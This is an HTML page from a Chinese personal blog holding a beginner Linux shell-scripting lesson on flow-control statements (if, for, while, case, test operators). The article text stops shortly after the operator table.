@@ -1,0 +1,1141 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>LINUX Shell Scripts 第二课 流程控制语句 | Amy and Booboo</title>
+  <meta name="keywords" content=" 培训 , LinuxBash脚本 ">
+  <meta name="description" content="LINUX Shell Scripts 第二课 流程控制语句 | Amy and Booboo">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="除了自己的无知，我什么都不懂。－苏格拉底">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Amy and Booboo">
+<meta property="og:url" content="http://www.toberoot.com/about/index.html">
+<meta property="og:site_name" content="Amy and Booboo">
+<meta property="og:description" content="除了自己的无知，我什么都不懂。－苏格拉底">
+<meta property="article:published_time" content="2020-03-22T14:48:00.876Z">
+<meta property="article:modified_time" content="2020-03-22T14:48:00.875Z">
+<meta property="article:author" content="BoobooWei">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/influx.svg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/css/hl_theme/sublime.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1" ></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.0.1" ></script>
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Amy and Booboo" type="application/atom+xml">
+</head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value="">
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/my.png" />
+</a>
+<div class="author">
+    <span>BoobooWei</span>
+</div>
+
+<div class="icon">
+    
+        
+        <a title="email" href="mailto:rgweiyaping@hotmail.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active">全部文章<small>(42)</small></div></li>
+    
+        
+            
+            <li><div data-rel="往昔追忆"><i class="fold iconfont icon-right"></i>往昔追忆<small>(6)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="小二班">小二班<small>(6)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+            <li><div data-rel="技术培训"><i class="fold iconfont icon-right"></i>技术培训<small>(30)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="Linux系统基础培训">Linux系统基础培训<small>(14)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Linux简易服务教程">Linux简易服务教程<small>(9)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="LinuxBash脚本教程">LinuxBash脚本教程<small>(7)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+            <li><div data-rel="技术广角"><i class="fold iconfont icon-right"></i>技术广角<small>(6)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="MySQL">MySQL<small>(3)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Hexo">Hexo<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Oracle">Oracle<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="MongoDB">MongoDB<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    </div>
+    <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="42">
+<input type="hidden" id="yelog_site_word_count" value="145.5k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+            <li><a target="_blank" href="https://www.changhai.org/">科普作家卢昌海</a></li>
+            
+            <li><a target="_blank" href="https://github.com/booboowei">GitHub</a></li>
+            
+            <li><a target="_blank" href="https://applegit11.github.io/">AppleHuang</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode === 13){return false;}">
+        <input id="local-search-input" class="search" type="text" placeholder="Search..." />
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a class="color5">宝宝成长</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">培训</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">Linux基础服务</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">Linux</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">数据救援</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">hexo</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">SQL优化</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">锁故障</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">RDS</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">主从同步</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">LinuxBash脚本</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class="往昔追忆 小二班 "
+           href="/2018/09/10/amy_life/%E5%90%91%E6%9C%88%E4%BA%AE%E8%AF%B4%E6%99%9A%E5%AE%89/"
+           data-tag="宝宝成长"
+           data-author="" >
+            <span class="post-title" title="向月亮说晚安">向月亮说晚安</span>
+            <span class="post-date" title="2018-09-10 11:26:39">2018/09/10</span>
+        </a>
+        
+        <a  class="往昔追忆 小二班 "
+           href="/2018/09/30/amy_life/%E5%9B%BD%E5%BA%86%E5%89%8D%E5%AD%A6%E6%B4%97%E6%89%8B/"
+           data-tag="宝宝成长"
+           data-author="" >
+            <span class="post-title" title="国庆前学洗手">国庆前学洗手</span>
+            <span class="post-date" title="2018-09-30 10:43:53">2018/09/30</span>
+        </a>
+        
+        <a  class="往昔追忆 小二班 "
+           href="/2018/09/29/amy_life/%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/"
+           data-tag="宝宝成长"
+           data-author="" >
+            <span class="post-title" title="宝宝们上班啦">宝宝们上班啦</span>
+            <span class="post-date" title="2018-09-29 10:43:41">2018/09/29</span>
+        </a>
+        
+        <a  class="往昔追忆 小二班 "
+           href="/2018/09/20/amy_life/%E5%AE%9D%E5%AE%9D%E4%BB%AC%E5%BC%80%E5%A7%8B%E6%BC%B1%E5%8F%A3%E4%BA%86/"
+           data-tag="宝宝成长"
+           data-author="" >
+            <span class="post-title" title="宝宝们开始漱口了">宝宝们开始漱口了</span>
+            <span class="post-date" title="2018-09-20 12:08:51">2018/09/20</span>
+        </a>
+        
+        <a  class="往昔追忆 小二班 "
+           href="/2018/09/19/amy_life/%E5%AE%B6%E9%95%BF%E4%BC%9A/"
+           data-tag="宝宝成长"
+           data-author="" >
+            <span class="post-title" title="家长会">家长会</span>
+            <span class="post-date" title="2018-09-19 11:40:55">2018/09/19</span>
+        </a>
+        
+        <a  class="往昔追忆 小二班 "
+           href="/2018/09/21/amy_life/%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/"
+           data-tag="宝宝成长"
+           data-author="" >
+            <span class="post-title" title="月饼烘培和小小搬运工">月饼烘培和小小搬运工</span>
+            <span class="post-date" title="2018-09-21 12:25:51">2018/09/21</span>
+        </a>
+        
+        <a  class="技术培训 Linux简易服务教程 "
+           href="/2016/12/23/booboo_easy_service/00_linux_classroom_env/"
+           data-tag="培训,Linux基础服务"
+           data-author="" >
+            <span class="post-title" title="LINUX 基础服务课程环境使用说明">LINUX 基础服务课程环境使用说明</span>
+            <span class="post-date" title="2016-12-22 21:06:27">2016/12/22</span>
+        </a>
+        
+        <a  class="技术培训 Linux简易服务教程 "
+           href="/2016/12/23/booboo_easy_service/02_ftp/"
+           data-tag="培训,Linux基础服务"
+           data-author="" >
+            <span class="post-title" title="FTP文件共享服务">FTP文件共享服务</span>
+            <span class="post-date" title="2016-12-22 21:06:27">2016/12/22</span>
+        </a>
+        
+        <a  class="技术培训 Linux简易服务教程 "
+           href="/2016/12/23/booboo_easy_service/03_nfs/"
+           data-tag="培训,Linux基础服务"
+           data-author="" >
+            <span class="post-title" title="NFS文件共享服务">NFS文件共享服务</span>
+            <span class="post-date" title="2016-12-22 21:06:27">2016/12/22</span>
+        </a>
+        
+        <a  class="技术培训 Linux简易服务教程 "
+           href="/2016/12/23/booboo_easy_service/01_dns/"
+           data-tag="培训,Linux基础服务"
+           data-author="" >
+            <span class="post-title" title="DNS域名解析服务">DNS域名解析服务</span>
+            <span class="post-date" title="2016-12-22 21:06:27">2016/12/22</span>
+        </a>
+        
+        <a  class="技术培训 Linux简易服务教程 "
+           href="/2016/12/23/booboo_easy_service/04_samba/"
+           data-tag="培训,Linux基础服务"
+           data-author="" >
+            <span class="post-title" title="SAMBA文件共享服务">SAMBA文件共享服务</span>
+            <span class="post-date" title="2016-12-22 21:06:27">2016/12/22</span>
+        </a>
+        
+        <a  class="技术培训 Linux简易服务教程 "
+           href="/2016/12/23/booboo_easy_service/05_apache/"
+           data-tag="培训,Linux基础服务"
+           data-author="" >
+            <span class="post-title" title="APACHE WEB服务">APACHE WEB服务</span>
+            <span class="post-date" title="2016-12-22 21:06:27">2016/12/22</span>
+        </a>
+        
+        <a  class="技术培训 Linux简易服务教程 "
+           href="/2016/12/23/booboo_easy_service/06_ntp_chrony/"
+           data-tag="培训,Linux基础服务"
+           data-author="" >
+            <span class="post-title" title="时间同步服务NTP和Chony">时间同步服务NTP和Chony</span>
+            <span class="post-date" title="2016-12-22 21:06:27">2016/12/22</span>
+        </a>
+        
+        <a  class="技术培训 Linux简易服务教程 "
+           href="/2016/12/23/booboo_easy_service/07_iptables_firewalld/"
+           data-tag="培训,Linux基础服务"
+           data-author="" >
+            <span class="post-title" title="防火墙 iptables">防火墙 iptables</span>
+            <span class="post-date" title="2016-12-22 21:06:27">2016/12/22</span>
+        </a>
+        
+        <a  class="技术培训 Linux简易服务教程 "
+           href="/2016/12/23/booboo_easy_service/ule-online/"
+           data-tag="培训,Linux基础服务"
+           data-author="" >
+            <span class="post-title" title="Linux简易服务上机考试">Linux简易服务上机考试</span>
+            <span class="post-date" title="2016-12-22 21:06:27">2016/12/22</span>
+        </a>
+        
+        <a  class="技术培训 Linux系统基础培训 "
+           href="/2016/12/22/booboo_linux_base/02-Linux%E7%94%A8%E6%88%B7%E5%92%8C%E7%BB%84/"
+           data-tag="培训,Linux"
+           data-author="" >
+            <span class="post-title" title="Linux 用户和组">Linux 用户和组</span>
+            <span class="post-date" title="2016-12-21 20:06:27">2016/12/21</span>
+        </a>
+        
+        <a  class="技术培训 Linux系统基础培训 "
+           href="/2016/12/22/booboo_linux_base/01-Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"
+           data-tag="培训,Linux"
+           data-author="" >
+            <span class="post-title" title="Linux 基础命令">Linux 基础命令</span>
+            <span class="post-date" title="2016-12-21 20:06:27">2016/12/21</span>
+        </a>
+        
+        <a  class="技术培训 Linux系统基础培训 "
+           href="/2016/12/22/booboo_linux_base/05-Linux%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/"
+           data-tag="培训,Linux"
+           data-author="" >
+            <span class="post-title" title="Linux 软件安装">Linux 软件安装</span>
+            <span class="post-date" title="2016-12-21 20:06:27">2016/12/21</span>
+        </a>
+        
+        <a  class="技术培训 Linux系统基础培训 "
+           href="/2016/12/22/booboo_linux_base/00-linux_history/"
+           data-tag="培训,Linux"
+           data-author="" >
+            <span class="post-title" title="LINUX HISTORY">LINUX HISTORY</span>
+            <span class="post-date" title="2016-12-21 20:06:27">2016/12/21</span>
+        </a>
+        
+        <a  class="技术培训 Linux系统基础培训 "
+           href="/2016/12/22/booboo_linux_base/04-Linux%E5%8E%8B%E7%BC%A9%E6%89%93%E5%8C%85/"
+           data-tag="培训,Linux"
+           data-author="" >
+            <span class="post-title" title="Linux 压缩打包">Linux 压缩打包</span>
+            <span class="post-date" title="2016-12-21 20:06:27">2016/12/21</span>
+        </a>
+        
+        <a  class="技术培训 Linux系统基础培训 "
+           href="/2016/12/22/booboo_linux_base/03-Linux%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/"
+           data-tag="培训,Linux"
+           data-author="" >
+            <span class="post-title" title="Linux 文件和目录">Linux 文件和目录</span>
+            <span class="post-date" title="2016-12-21 20:06:27">2016/12/21</span>
+        </a>
+        
+        <a  class="技术培训 Linux系统基础培训 "
+           href="/2016/12/22/booboo_linux_base/06-Vim%E7%BC%96%E8%BE%91%E5%99%A8/"
+           data-tag="培训,Linux"
+           data-author="" >
+            <span class="post-title" title="Linux Vim 编辑器">Linux Vim 编辑器</span>
+            <span class="post-date" title="2016-12-21 20:06:27">2016/12/21</span>
+        </a>
+        
+        <a  class="技术培训 Linux系统基础培训 "
+           href="/2016/12/22/booboo_linux_base/07-Bash%E7%AE%80%E4%BB%8B/"
+           data-tag="培训,Linux"
+           data-author="" >
+            <span class="post-title" title="Linux Bash简介">Linux Bash简介</span>
+            <span class="post-date" title="2016-12-21 20:06:27">2016/12/21</span>
+        </a>
+        
+        <a  class="技术培训 Linux系统基础培训 "
+           href="/2016/12/22/booboo_linux_base/08-%E6%97%A5%E5%BF%97%E5%92%8C%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/"
+           data-tag="培训,Linux"
+           data-author="" >
+            <span class="post-title" title="Linux 日志和计划任务">Linux 日志和计划任务</span>
+            <span class="post-date" title="2016-12-21 20:06:27">2016/12/21</span>
+        </a>
+        
+        <a  class="技术培训 Linux系统基础培训 "
+           href="/2016/12/22/booboo_linux_base/10-Linux%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/"
+           data-tag="培训,Linux"
+           data-author="" >
+            <span class="post-title" title="Linux 开机启动流程">Linux 开机启动流程</span>
+            <span class="post-date" title="2016-12-21 20:06:27">2016/12/21</span>
+        </a>
+        
+        <a  class="技术培训 Linux系统基础培训 "
+           href="/2016/12/22/booboo_linux_base/09-Linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%92%8C%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/"
+           data-tag="培训,Linux"
+           data-author="" >
+            <span class="post-title" title="Linux 文件系统和磁盘管理">Linux 文件系统和磁盘管理</span>
+            <span class="post-date" title="2016-12-21 20:06:27">2016/12/21</span>
+        </a>
+        
+        <a  class="技术培训 Linux系统基础培训 "
+           href="/2016/12/22/booboo_linux_base/12-SELINUX/"
+           data-tag="培训,Linux"
+           data-author="" >
+            <span class="post-title" title="Linux SELINUX">Linux SELINUX</span>
+            <span class="post-date" title="2016-12-21 20:06:27">2016/12/21</span>
+        </a>
+        
+        <a  class="技术培训 Linux系统基础培训 "
+           href="/2016/12/22/booboo_linux_base/11-Linux%E5%86%85%E6%A0%B8/"
+           data-tag="培训,Linux"
+           data-author="" >
+            <span class="post-title" title="Linux 内核">Linux 内核</span>
+            <span class="post-date" title="2016-12-21 20:06:27">2016/12/21</span>
+        </a>
+        
+        <a  class="技术培训 Linux系统基础培训 "
+           href="/2016/12/22/booboo_linux_base/13-%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"
+           data-tag="培训,Linux"
+           data-author="" >
+            <span class="post-title" title="Linux 进程管理">Linux 进程管理</span>
+            <span class="post-date" title="2016-12-21 20:06:27">2016/12/21</span>
+        </a>
+        
+        <a  class="技术广角 MySQL "
+           href="/2018/05/17/booboo_others/MySQL%E4%B8%80%E6%AC%A1%E6%83%8A%E5%BF%83%E5%8A%A8%E9%AD%84%E5%9C%B0%E6%95%B0%E6%8D%AE%E5%BC%BA%E5%88%B6%E6%81%A2%E5%A4%8D/"
+           data-tag="数据救援"
+           data-author="" >
+            <span class="post-title" title="MySQL一次惊心动魄地数据强制恢复">MySQL一次惊心动魄地数据强制恢复</span>
+            <span class="post-date" title="2018-05-16 19:58:02">2018/05/16</span>
+        </a>
+        
+        <a  class="技术广角 Hexo "
+           href="/2020/03/22/booboo_others/hello-world/"
+           data-tag="hexo"
+           data-author="" >
+            <span class="post-title" title="Hello World">Hello World</span>
+            <span class="post-date" title="2020-03-22 14:23:51">2020/03/22</span>
+        </a>
+        
+        <a  class="技术广角 Oracle "
+           href="/2018/05/29/booboo_others/oracle%E6%95%B0%E6%8D%AE%E5%BA%93SQL%E4%BC%98%E5%8C%96-%E7%B4%A2%E5%BC%95%E7%BC%BA%E5%A4%B1/"
+           data-tag="SQL优化"
+           data-author="" >
+            <span class="post-title" title="Oracle数据库SQL优化_索引缺失">Oracle数据库SQL优化_索引缺失</span>
+            <span class="post-date" title="2018-05-28 18:09:32">2018/05/28</span>
+        </a>
+        
+        <a  class="技术广角 MySQL "
+           href="/2017/08/19/booboo_others/MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"
+           data-tag="锁故障"
+           data-author="" >
+            <span class="post-title" title="MySQL的元锁MDL发生场景和解决方法总结">MySQL的元锁MDL发生场景和解决方法总结</span>
+            <span class="post-date" title="2017-08-18 20:06:27">2017/08/18</span>
+        </a>
+        
+        <a  class="技术广角 MySQL "
+           href="/2018/08/22/booboo_others/rds-for-mysql-5-7%E5%88%B0%E8%87%AA%E5%BB%BAMySQL%E4%B8%BB%E4%BB%8E%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3user%E8%A1%A8%E5%AE%9E%E7%8E%B0%E4%BB%8E%E5%BA%93%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E6%9B%B4%E6%94%B9%E5%8A%9F%E8%83%BD/"
+           data-tag="RDS,主从同步"
+           data-author="" >
+            <span class="post-title" title="突破阿里限制实现&#34;RDS For MySQL 5.7到自建MySQL主从&#34;">突破阿里限制实现&#34;RDS For MySQL 5.7到自建MySQL主从&#34;</span>
+            <span class="post-date" title="2018-08-22 10:41:15">2018/08/22</span>
+        </a>
+        
+        <a  class="技术广角 MongoDB "
+           href="/2018/08/03/booboo_others/%E5%88%A9%E7%94%A8split%E5%B7%A5%E5%85%B7%E8%A7%A3%E5%86%B3%E4%B8%80%E6%AC%A1MongoDB%E6%97%A5%E5%BF%97%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/"
+           data-tag="数据救援"
+           data-author="" >
+            <span class="post-title" title="利用split工具解决一次MongoDB日志异常问题">利用split工具解决一次MongoDB日志异常问题</span>
+            <span class="post-date" title="2018-08-03 12:25:24">2018/08/03</span>
+        </a>
+        
+        <a  class="技术培训 LinuxBash脚本教程 "
+           href="/2016/12/23/booboo_bash_shell_scripts/00_shell_variables/"
+           data-tag="培训,LinuxBash脚本"
+           data-author="" >
+            <span class="post-title" title="LINUX Shell Scripts 第一课 简介和变量">LINUX Shell Scripts 第一课 简介和变量</span>
+            <span class="post-date" title="2016-12-22 21:06:27">2016/12/22</span>
+        </a>
+        
+        <a  class="技术培训 LinuxBash脚本教程 "
+           href="/2016/12/23/booboo_bash_shell_scripts/01_shell_flow_control_statement/"
+           data-tag="培训,LinuxBash脚本"
+           data-author="" >
+            <span class="post-title" title="LINUX Shell Scripts 第二课 流程控制语句">LINUX Shell Scripts 第二课 流程控制语句</span>
+            <span class="post-date" title="2016-12-22 21:06:27">2016/12/22</span>
+        </a>
+        
+        <a  class="技术培训 LinuxBash脚本教程 "
+           href="/2016/12/23/booboo_bash_shell_scripts/02_shell_regular_expression/"
+           data-tag="培训,LinuxBash脚本"
+           data-author="" >
+            <span class="post-title" title="LINUX Shell Scripts 第三课:正则表达式">LINUX Shell Scripts 第三课:正则表达式</span>
+            <span class="post-date" title="2016-12-22 21:06:27">2016/12/22</span>
+        </a>
+        
+        <a  class="技术培训 LinuxBash脚本教程 "
+           href="/2016/12/23/booboo_bash_shell_scripts/03_shell_sed_awk/"
+           data-tag="培训,LinuxBash脚本"
+           data-author="" >
+            <span class="post-title" title="LINUX Shell Scripts 第四课 Sed">LINUX Shell Scripts 第四课 Sed</span>
+            <span class="post-date" title="2016-12-22 21:06:27">2016/12/22</span>
+        </a>
+        
+        <a  class="技术培训 LinuxBash脚本教程 "
+           href="/2016/12/23/booboo_bash_shell_scripts/shell%E4%B8%8A%E6%9C%BA/"
+           data-tag="培训,LinuxBash脚本"
+           data-author="" >
+            <span class="post-title" title="LINUX Shell Scripts 第六课 上机考试">LINUX Shell Scripts 第六课 上机考试</span>
+            <span class="post-date" title="2016-12-22 21:06:27">2016/12/22</span>
+        </a>
+        
+        <a  class="技术培训 LinuxBash脚本教程 "
+           href="/2016/12/23/booboo_bash_shell_scripts/shell%E7%AC%94%E8%AF%95/"
+           data-tag="培训,LinuxBash脚本"
+           data-author="" >
+            <span class="post-title" title="LINUX Shell Scripts 第七课 笔试">LINUX Shell Scripts 第七课 笔试</span>
+            <span class="post-date" title="2016-12-22 21:06:27">2016/12/22</span>
+        </a>
+        
+        <a  class="技术培训 LinuxBash脚本教程 "
+           href="/2016/12/23/booboo_bash_shell_scripts/04_shell_brackets/"
+           data-tag="培训,LinuxBash脚本"
+           data-author="" >
+            <span class="post-title" title="LINUX Shell Scripts 第五课 各种括号的作用">LINUX Shell Scripts 第五课 各种括号的作用</span>
+            <span class="post-date" title="2016-12-22 21:06:27">2016/12/22</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-booboo_bash_shell_scripts/01_shell_flow_control_statement" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">LINUX Shell Scripts 第二课 流程控制语句</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a  data-rel="技术培训">技术培训</a>/
+            
+                <a  data-rel="LinuxBash脚本教程">LinuxBash脚本教程</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a class="color3">培训</a>
+            
+            <a class="color2">LinuxBash脚本</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2020-03-24 05:15:44'>2016-12-22 21:06</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:3.4k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+        <span class="top-comment" title="跳转至评论区">
+            <a href="#comments">
+                评论:<span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </a>
+        </span>
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#判断条件"><span class="toc-text">判断条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#if-语法格式"><span class="toc-text">if 语法格式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#课堂练习"><span class="toc-text">课堂练习</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#for-语法格式"><span class="toc-text">for 语法格式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#取值范围"><span class="toc-text">取值范围</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#命令行方式"><span class="toc-text">命令行方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#课堂练习-1"><span class="toc-text">课堂练习</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#拓展题"><span class="toc-text">拓展题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#while-语法格式"><span class="toc-text">while 语法格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#until-语法格式"><span class="toc-text">until 语法格式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#课堂练习-2"><span class="toc-text">课堂练习</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#晚自习作业"><span class="toc-text">晚自习作业</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#case-语法格式"><span class="toc-text">case 语法格式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#课堂练习-3"><span class="toc-text">课堂练习</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#continue-语法格式"><span class="toc-text">continue 语法格式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#课堂练习-4"><span class="toc-text">课堂练习</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#break-语法格式"><span class="toc-text">break 语法格式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#课堂练习-5"><span class="toc-text">课堂练习</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shift-语法格式"><span class="toc-text">shift 语法格式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#课堂练习-6"><span class="toc-text">课堂练习</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#function-语法格式"><span class="toc-text">function 语法格式</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ol>
+<li><p>shell 的基本组成元素</p>
+<ul>
+<li>1&gt; 魔法字符 “ #! ”: 出现在脚本第一行 , 用于定义命令解释器。</li>
+<li>2&gt; “ # ” 号开头的行 : 除了第一行的魔法字符以外 , 其他以 ” # “ 号开头 的行是注示。这些行不会被运行 , 只是给人阅读使用。</li>
+<li>3&gt; 系统命令 :shell 脚本中运行解释的系统命令。</li>
+<li>4&gt; 变量 : 脚本运行过程中某些反复调用的值的暂存地。</li>
+<li>5&gt; 流程控制语句 : 判断 , 循环 , 跳转等流程控制。</li>
+</ul>
+</li>
+<li><p>执行脚本的方法</p>
+<ul>
+<li>1&gt; bash 脚本名称 bash -x 以调试模式来运行脚本</li>
+<li>2&gt; ./ 脚本名称 –&gt; 需要对脚本有可执行的权限</li>
+</ul>
+</li>
+<li><p>shell的基本语法</p>
+<ul>
+<li>条件判断语句     if test</li>
+<li>循环语句    for while unitl</li>
+<li>其他流程控制     case continue break shift function</li>
+</ul>
+</li>
+</ol>
+<h3 id="判断条件"><a href="#判断条件" class="headerlink" title="判断条件"></a>判断条件</h3><p>test 判断—————man test 查看的相关的判断指令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> 	数字的判断 	字符的判断 	文件的判断</span><br><span class="line">-gt 大于 	-z 空 		-d 文件是不是一个目录</span><br><span class="line">-ge 大于等于 	=  字符相等 	-f 是不是一个普通文件</span><br><span class="line">-lt 小于 	!= 字符不相等 	-e 文件是不是存在</span><br><span class="line">-le 小于等于 	-n 非空 	</span><br><span class="line">-ne 不等于 	-a 逻辑与</span><br><span class="line">-eq 等于 	-o 逻辑或</span><br></pre></td></tr></table></figure>
+<pre><code>注意 ：
+* [ ] 括号两边有空格
